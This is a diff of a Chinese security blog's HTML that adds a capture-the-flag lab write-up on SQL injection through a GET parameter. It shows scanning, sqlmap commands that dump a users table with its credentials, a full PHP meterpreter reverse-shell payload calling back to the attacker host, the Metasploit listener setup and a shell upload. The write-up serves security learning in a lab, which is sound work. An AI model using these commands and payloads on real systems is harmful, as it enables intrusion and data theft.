@@ -6,15 +6,33 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href>
-  <title>Saw,Learnt,To think</title>
+  <title>SQL注入-GET参数 | Saw,Learnt,To think</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Saw,Learnt,To think">
-<meta property="og:url" content="/page/2/index.html">
+  <meta name="description" content="实验环境12攻击机	192.168.1.200靶场机	192.168.1.175">
+<meta name="keywords" content="CTF靶机系列">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入-GET参数">
+<meta property="og:url" content="/2019/09/07/SQL注入-GET参数/index.html">
 <meta property="og:site_name" content="Saw,Learnt,To think">
+<meta property="og:description" content="实验环境12攻击机	192.168.1.200靶场机	192.168.1.175">
 <meta property="og:locale" content="en">
+<meta property="og:image" content="/Users/caizhe/Desktop/CTF%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5-GET%E5%8F%82%E6%95%B0/1.png">
+<meta property="og:image" content="/Users/caizhe/Desktop/CTF%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5-GET%E5%8F%82%E6%95%B0/2.png">
+<meta property="og:image" content="/Users/caizhe/Desktop/CTF%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5-GET%E5%8F%82%E6%95%B0/3.png">
+<meta property="og:image" content="/Users/caizhe/Desktop/CTF%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5-GET%E5%8F%82%E6%95%B0/4.png">
+<meta property="og:image" content="/Users/caizhe/Desktop/CTF%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5-GET%E5%8F%82%E6%95%B0/5.png">
+<meta property="og:image" content="/Users/caizhe/Desktop/CTF%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5-GET%E5%8F%82%E6%95%B0/6.png">
+<meta property="og:image" content="/Users/caizhe/Desktop/CTF%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5-GET%E5%8F%82%E6%95%B0/7.png">
+<meta property="og:image" content="/Users/caizhe/Desktop/CTF%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5-GET%E5%8F%82%E6%95%B0/8.png">
+<meta property="og:image" content="/Users/caizhe/Desktop/CTF%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5-GET%E5%8F%82%E6%95%B0/9.png">
+<meta property="og:image" content="/Users/caizhe/Desktop/CTF%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5-GET%E5%8F%82%E6%95%B0/10.png">
+<meta property="og:image" content="/Users/caizhe/Desktop/CTF%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5-GET%E5%8F%82%E6%95%B0/11.png">
+<meta property="og:image" content="/Users/caizhe/Desktop/CTF%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5-GET%E5%8F%82%E6%95%B0/12.png">
+<meta property="og:updated_time" content="2020-02-12T14:03:59.080Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Saw,Learnt,To think">
+<meta name="twitter:title" content="SQL注入-GET参数">
+<meta name="twitter:description" content="实验环境12攻击机	192.168.1.200靶场机	192.168.1.175">
+<meta name="twitter:image" content="/Users/caizhe/Desktop/CTF%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5-GET%E5%8F%82%E6%95%B0/1.png">
   
     <link rel="alternative" href="/atom.xml" title="Saw,Learnt,To think" type="application/atom+xml">
   
@@ -142,16 +160,14 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-    <article id="post-SQL注入-GET参数" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+            <article id="post-SQL注入-GET参数" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/09/07/SQL注入-GET参数/">SQL注入-GET参数</a>
+    <h1 class="article-title" itemprop="name">
+      SQL注入-GET参数
     </h1>
   
 
@@ -165,171 +181,100 @@
     <div class="article-entry" itemprop="articleBody">
       
         <h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">攻击机	192.168.1.200</span><br><span class="line">靶场机	192.168.1.175</span><br></pre></td></tr></table></figure>
-        
-          <a class="article-more-a" href="/2019/09/07/SQL注入-GET参数/#more">more >></a>
-        
-      
 
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">CTF靶机系列</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/09/07/SQL注入-GET参数/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
+<a id="more"></a>
 
 
 
+<h3 id="步骤一：信息探测"><a href="#步骤一：信息探测" class="headerlink" title="步骤一：信息探测"></a>步骤一：信息探测</h3><h4 id="①发现靶机"><a href="#①发现靶机" class="headerlink" title="①发现靶机"></a>①发现靶机</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -r 192.168.1.1/24</span><br></pre></td></tr></table></figure>
 
-  
-    <article id="post-FTP服务后门利用" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/08/26/FTP服务后门利用/">FTP服务后门利用</a>
-    </h1>
-  
+<p><img src="/Users/caizhe/Desktop/CTF%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5-GET%E5%8F%82%E6%95%B0/1.png" alt="1"></p>
+<h4 id="②nmap扫描"><a href="#②nmap扫描" class="headerlink" title="②nmap扫描"></a>②nmap扫描</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -T4 -v 192.168.1.175</span><br><span class="line">nmap -sV 192.168.1.175</span><br></pre></td></tr></table></figure>
 
-        
-        <a href="/2019/08/26/FTP服务后门利用/" class="archive-article-date">
-  	<time datetime="2019-08-26T10:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-26</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h3><ul>
-<li>File Transfer Protocol（文件传输协议）</li>
-<li>双向传输</li>
-<li>用户可通过客户机程序向远程主机，下载文件</li>
-</ul>
-        
-          <a class="article-more-a" href="/2019/08/26/FTP服务后门利用/#more">more >></a>
-        
-      
+<p><img src="/Users/caizhe/Desktop/CTF%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5-GET%E5%8F%82%E6%95%B0/2.png" alt="2"></p>
+<p>发现22端口和80端口开放</p>
+<h4 id="③Nikto扫描"><a href="#③Nikto扫描" class="headerlink" title="③Nikto扫描"></a>③Nikto扫描</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto -host 192.168.1.175</span><br></pre></td></tr></table></figure>
 
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">CTF靶机系列</a>
-        		</li>
-      		
-		</ul>
-	</div>
+<p><img src="/Users/caizhe/Desktop/CTF%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5-GET%E5%8F%82%E6%95%B0/3.png" alt="3"></p>
+<h3 id="步骤二：信息分析"><a href="#步骤二：信息分析" class="headerlink" title="步骤二：信息分析"></a>步骤二：信息分析</h3><p>根据nmap和Nikto工具扫描得知有22端口、80端口以及管理员登入界面</p>
+<h3 id="步骤三：漏洞扫描工具利用"><a href="#步骤三：漏洞扫描工具利用" class="headerlink" title="步骤三：漏洞扫描工具利用"></a>步骤三：漏洞扫描工具利用</h3><h4 id="①OWSAP-ZAP工具利用"><a href="#①OWSAP-ZAP工具利用" class="headerlink" title="①OWSAP ZAP工具利用"></a>①OWSAP ZAP工具利用</h4><p><img src="/Users/caizhe/Desktop/CTF%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5-GET%E5%8F%82%E6%95%B0/4.png" alt="4"></p>
+<p>发现管理员登入界面，存在SQL注入漏洞</p>
+<p><img src="/Users/caizhe/Desktop/CTF%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5-GET%E5%8F%82%E6%95%B0/5.png" alt="5"></p>
+<h4 id="②利用sqlmap工具获取信息"><a href="#②利用sqlmap工具获取信息" class="headerlink" title="②利用sqlmap工具获取信息"></a>②利用sqlmap工具获取信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.175/cat.php?id=3&quot; --batch</span><br></pre></td></tr></table></figure>
 
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/08/26/FTP服务后门利用/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-SMB信息泄露" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/08/25/SMB信息泄露/">SMB信息泄露</a>
-    </h1>
-  
-
-        
-        <a href="/2019/08/25/SMB信息泄露/" class="archive-article-date">
-  	<time datetime="2019-08-25T08:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-25</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="SMB介绍"><a href="#SMB介绍" class="headerlink" title="SMB介绍"></a>SMB介绍</h3><p><img src="/2019/08/25/SMB信息泄露/1.png" alt="1"></p>
-<p><strong>可以简单理解为共享资源的一种协议</strong></p>
+<p><img src="/Users/caizhe/Desktop/CTF%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5-GET%E5%8F%82%E6%95%B0/6.png" alt="6"></p>
+<p>说明存在SQL注入漏洞</p>
+<p><strong>==sqlmap信息获取步骤==</strong></p>
 <ul>
-<li>注意端口一般为139、445</li>
+<li><p>获取数据库名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.175/cat.php?id=3&quot; --dbs</span><br></pre></td></tr></table></figure>
+
+<p><img src="/Users/caizhe/Desktop/CTF%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5-GET%E5%8F%82%E6%95%B0/7.png" alt="7"></p>
+</li>
+<li><p>遍历浏览每个数据的表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.175/cat.php?id=3&quot; -D &quot;photoblog&quot; --tables</span><br></pre></td></tr></table></figure>
+
+<p><img src="/Users/caizhe/Desktop/CTF%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5-GET%E5%8F%82%E6%95%B0/8.png" alt="8"></p>
+</li>
+<li><p>遍历浏览表中的字段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.175/cat.php?id=3&quot; -D &quot;photoblog&quot; -T &quot;users&quot; --columns</span><br></pre></td></tr></table></figure>
+
+<p><img src="/Users/caizhe/Desktop/CTF%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5-GET%E5%8F%82%E6%95%B0/9.png" alt="9"></p>
+</li>
+<li><p>遍历浏览字段中的值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.175/cat.php?id=3&quot; -D &quot;photoblog&quot; -T &quot;users&quot; -C &quot;login,password&quot; --dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="/Users/caizhe/Desktop/CTF%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5-GET%E5%8F%82%E6%95%B0/10.png" alt="10"></p>
+<p>发现用户名：admin,  密码：P4ssw0rd</p>
+</li>
 </ul>
-        
-          <a class="article-more-a" href="/2019/08/25/SMB信息泄露/#more">more >></a>
-        
+<h3 id="步骤四：shell控制"><a href="#步骤四：shell控制" class="headerlink" title="步骤四：shell控制"></a>步骤四：shell控制</h3><h4 id="①生成shell"><a href="#①生成shell" class="headerlink" title="①生成shell"></a>①生成shell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.200 lport=4444 -f raw</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php /**/ error_reporting(0); $ip = &apos;192.168.1.200&apos;; $port = 4444; if (($f = &apos;stream_socket_client&apos;) &amp;&amp; is_callable($f)) &#123; $s = $f(&quot;tcp://&#123;$ip&#125;:&#123;$port&#125;&quot;); $s_type = &apos;stream&apos;; &#125; if (!$s &amp;&amp; ($f = &apos;fsockopen&apos;) &amp;&amp; is_callable($f)) &#123; $s = $f($ip, $port); $s_type = &apos;stream&apos;; &#125; if (!$s &amp;&amp; ($f = &apos;socket_create&apos;) &amp;&amp; is_callable($f)) &#123; $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) &#123; die(); &#125; $s_type = &apos;socket&apos;; &#125; if (!$s_type) &#123; die(&apos;no socket funcs&apos;); &#125; if (!$s) &#123; die(&apos;no socket&apos;); &#125; switch ($s_type) &#123; case &apos;stream&apos;: $len = fread($s, 4); break; case &apos;socket&apos;: $len = socket_read($s, 4); break; &#125; if (!$len) &#123; die(); &#125; $a = unpack(&quot;Nlen&quot;, $len); $len = $a[&apos;len&apos;]; $b = &apos;&apos;; while (strlen($b) &lt; $len) &#123; switch ($s_type) &#123; case &apos;stream&apos;: $b .= fread($s, $len-strlen($b)); break; case &apos;socket&apos;: $b .= socket_read($s, $len-strlen($b)); break; &#125; &#125; $GLOBALS[&apos;msgsock&apos;] = $s; $GLOBALS[&apos;msgsock_type&apos;] = $s_type; if (extension_loaded(&apos;suhosin&apos;) &amp;&amp; ini_get(&apos;suhosin.executor.disable_eval&apos;)) &#123; $suhosin_bypass=create_function(&apos;&apos;, $b); $suhosin_bypass(); &#125; else &#123; eval($b); &#125; die();</span><br></pre></td></tr></table></figure>
+
+<h4 id="②msfconsole利用shell，启动监听"><a href="#②msfconsole利用shell，启动监听" class="headerlink" title="②msfconsole利用shell，启动监听"></a>②msfconsole利用shell，启动监听</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload php/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.1.200</span><br><span class="line">set lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<h4 id="③上传并执行shell"><a href="#③上传并执行shell" class="headerlink" title="③上传并执行shell"></a>③上传并执行shell</h4><p>登入以下网址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.175/admin/login.php</span><br></pre></td></tr></table></figure>
+
+<p>用户名：admin,  密码：P4ssw0rd</p>
+<p><img src="/Users/caizhe/Desktop/CTF%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5-GET%E5%8F%82%E6%95%B0/11.png" alt="11"></p>
+<p>点击shell.PHP后，会有如下所示：</p>
+<p><img src="/Users/caizhe/Desktop/CTF%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5-GET%E5%8F%82%E6%95%B0/12.png" alt="12"></p>
+
       
 
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃辣条<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/img/alipay.png">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/img/weixinpay.png">
+                      <span class="reward-type">微信</span>
+                    </div>
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
       
     </div>
     <div class="article-info article-info-index">
@@ -349,16 +294,84 @@
       
 
       
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/08/25/SMB信息泄露/">展开全文 >></a>
-        </p>
-      
 
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http:/2019/09/07/SQL注入-GET参数/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
       
       <div class="clearfix"></div>
     </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+    <a href="/2019/09/10/CTF-Web题-简单/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          攻防世界-Web题-简单
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/08/26/FTP服务后门利用/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">FTP服务后门利用</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -378,241 +391,14 @@
 
 
 
-
-  
-    <article id="post-SSH服务测试" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/08/25/SSH服务测试/">SSH服务测试</a>
-    </h1>
-  
-
-        
-        <a href="/2019/08/25/SSH服务测试/" class="archive-article-date">
-  	<time datetime="2019-08-25T05:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-25</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><img src="/2019/08/25/SSH服务测试/1.png" alt="1"></p>
-        
-          <a class="article-more-a" href="/2019/08/25/SSH服务测试/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">CTF靶机系列</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/08/25/SSH服务测试/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-微信聊天记录教程" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/08/07/微信聊天记录教程/">微信聊天记录导出教程</a>
-    </h1>
-  
-
-        
-        <a href="/2019/08/07/微信聊天记录教程/" class="archive-article-date">
-  	<time datetime="2019-08-07T07:35:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-07</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="步骤一："><a href="#步骤一：" class="headerlink" title="步骤一："></a>步骤一：</h3><p>下载或打开iTunes软件，点击立即备份。如下图所示：</p>
-        
-          <a class="article-more-a" href="/2019/08/07/微信聊天记录教程/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">计算机小技巧</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/08/07/微信聊天记录教程/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-随笔/博客建立的第一天" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/08/01/随笔/博客建立的第一天/">博客建立的第一天</a>
-    </h1>
-  
-
-        
-        <a href="/2019/08/01/随笔/博客建立的第一天/" class="archive-article-date">
-  	<time datetime="2019-08-01T09:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-01</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>​        陆陆续续的重零开始搭建博客,</p>
-<p>​        看到它慢慢变得好看充实起来, </p>
-<p>​        自己也变得充实开心起来了,</p>
-<p>​        至此,努力.</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">随笔</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/08/01/随笔/博客建立的第一天/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
   
   
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
-    </nav>
+  
+
+  
+
+  
+
   
 
 
@@ -637,8 +423,8 @@
     <script>
 	var yiliaConfig = {
 		mathjax: false,
-		isHome: true,
-		isPost: false,
+		isHome: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
